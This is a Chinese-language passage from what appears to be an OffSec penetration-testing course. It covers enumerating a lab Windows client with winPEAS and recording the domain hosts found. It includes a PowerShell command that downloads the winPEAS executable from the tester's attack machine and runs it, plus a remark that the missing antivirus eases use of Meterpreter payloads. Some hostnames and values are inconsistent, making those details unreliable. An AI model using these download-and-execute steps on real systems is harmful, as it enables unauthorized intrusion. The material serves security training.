

# OffSec

使用 Kali Linux 进行渗透测试

在本学习单元中，我们不会显式地对 Kali 上工作目录中的每个结果进行[记录]。但是，为了习惯文档记录的过程，你应该在跟进操作时对所有发现和信息创建笔记。

让我们从枚举 CLIENTWK1 机器开始。将 64 位的 winPEAS 可执行文件复制到 Python3 Web 服务器提供的目录。在 CLIENTWK1 上，我们将当前目录更改到 marcus 的家目录，并从 Kali 机器下载 winPEAS。下载完成后，我们将启动它。

```powers
PS C:\Windows\System32\PowerShell\v1.0> cd C:\Users\marcus
 C:\Users\marcus
```

```powers
PS C:\Users\marcus> iwr -uri http://192.168.119.5:8000/winPEASx64.exe -Outfile winPEAS.exe
iwr -uri http://192.168.119.5:8000/winPEASx64.exe -Outfile winPEAS.exe
```

```powers
PS C:\Users\marcus> .\winPEAS.exe
.\winPEAS.exe
```

列表 906 - 下载并执行 winPEAS

让我们查看 winPEAS 提供的某些结果。我们从“基础系统信息”部分开始。

### 基础系统信息
检查 Windows 版本是否受到某些已知漏洞：https://github.hacktricks.xyz/hardening-windows-local-privilege-escalation/kernel-exploits
主机名：CLIENTWK1
域名：beyond.com
产品名称 (ProductName): Windows 10 Pro
版本 ID (EditionID): Professional (专业版)

列表 907 - 基础系统信息

列表 907 显示 winPEAS 检测到 CLIENTWK1 的操作系统为 Windows 10。正如我们在课程中学学到的，winPEAS 可能会错误地将 Windows 11 识别为 Windows 10，因此，我们将使用 `systeminfo` 手动检查操作系统。

```powers
PS C:\Users\marcus> systeminfo
systeminfo
```

| 主机名: CLIENTWK1 |
| :--- |
| 操作系统名称: Microsoft Windows 11 Pro |
| 操作系统版本: 10.0.22000 N/A Build 22000 |

列表 908 - 操作系统信息

事实上，Windows 11 是 CLIENTWK1 上的操作系统。如果我们盲目地依赖 winPEAS 的结果，我们可能从一开始就做了错误的假设。

通过经验，渗透测试人员会形成一种直觉，判断自动化工具提供的哪些信息需要双检。

回到查看 winPEAS 的输出，我们遇到了 AV 部分。

### AV 信息
[X] 异常：对象引用未设置到对象的实例。
未检测到任何杀毒软件！！

| 列表 909 - AV 信息 |

未检测到任何杀毒软件。这将使用其他工具和 Meterpreter 等载荷变得更加容易。

让我们查看网络信息，例如网络接口、已知主机和 DNS 缓存。

### 网络接口和已知主机
掩码仅适用于 IPv4 地址
以太网0[00:50:56:8A:AF:27]: 172.16.6.243 / 255.255.255.250
网关:172.16.6.240
DNS:172.16.6.240
已知主机:

| 169.254.255.255 | 00-00-00-00-00-00 | 无效 |
| 172.16.6.240 | 00-50-56-8A-08-34 | 动态 |
| 172.16.6.240 | 00-50-56-8A-DA-71 | 动态 |
| 172.16.6.255 | FF-FF-FF-FF-FF-FF | 静态 |

DNS 缓存 --limit 70-
| 条目名称 | 数据 |
| :--- | :--- |
| CSRV1.beyond.com | 172.16.6.240 |
| mailssrv1.beyond.com | 172.16.6.254 |

| 列表 910 - 网络接口、已知主机和 DNS 缓存 |

此外，检测到内部 IP 地址为 172.16.6.254 的 MAILSRV，并通过 192.168.50.242 从外部视角枚举了该机器，我们可以安全地假设这是一个双宿主主机。

就像处理凭据一样，我们在 `/home/kali/beyond/` 中创建一个文本文件 `computer.txt`，以记录识别出的机器以及关于它们的额外信息。

```bash
kali@kali~$ cat computer.txt
172.16.6.240 - DCSRV.BEYOND.COM
-> 域控制器
```

172.16.6.254 - MAILSRV1.BEYONDCOM
-> 邮件服务器
-> 双宿主机 (外部 IP: 192.168.50.242)

172.16.6.243 - CLIENTWK1.BEYOND.COM
-> 用户 marcus_ 在此机器上获取邮件
列表 911 - 包含已识别目标机器的重要信息列表

查看 winPEAS 的其他结果，我们没有发现任何可以尝试潜在权限提升攻击的可操作信息。然而，我们应该提醒自己，我们处于模拟渗透测试中，而不是 CTF 实验室。因此，没有必要在每台机器上都是管理员权限。

> 虽然我们跳过了 winPEAS 的结果，但我们应该像真实的渗透测试那样仔细检查结果。在对系统进行本地枚举后，我们应该获得关键信息，并列在 Windows 权限提升模块的状况感知部分。

由于我们没有通过 winPEAS 识别出权限提升向量，且系统中没有可操作的内容（例如密码管理器），让我们开始枚举 AD 环境及其对象。

我们在课程中学习了执行此类枚举的多种技术。在本模块中，我们使用了带有 SharpHound 的 BloodHound。

